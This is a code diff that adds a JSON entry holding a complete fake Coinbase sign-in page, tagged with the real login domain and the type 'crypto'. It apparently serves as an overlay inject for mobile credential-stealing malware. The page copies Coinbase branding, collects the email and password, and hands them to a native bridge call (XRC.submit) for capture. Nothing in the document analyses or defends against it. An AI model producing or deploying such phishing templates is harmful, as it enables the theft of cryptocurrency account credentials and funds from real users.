@@ -1,0 +1,7 @@
+{
+  "id": "coinbase",
+  "domain": "login.coinbase.com",
+  "name": "Coinbase",
+  "type": "crypto",
+  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Coinbase - Sign In</title><style>body{margin:0;padding:0;background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}.box{padding:40px;width:90%;max-width:380px}.logo{text-align:center;margin-bottom:30px;font-size:28px;font-weight:bold;color:#0052FF}input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;background:#fff;color:#000;box-sizing:border-box;font-size:15px}input:focus{outline:none;border-color:#0052FF}button{width:100%;padding:14px;margin-top:16px;background:#0052FF;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer}button:active{opacity:0.8}.link{color:#0052FF;text-align:center;margin-top:16px;font-size:13px}</style></head><body><div class='box'><div class='logo'>coinbase</div><input type='email' id='email' placeholder='Email'><input type='password' id='password' placeholder='Password'><button onclick='submit()'>Sign in</button><div class='link'>Forgot password?</div></div><script>function submit(){var e=document.getElementById('email').value;var p=document.getElementById('password').value;XRC.submit(JSON.stringify({email:e,password:p}));}</script></body></html>"
+}
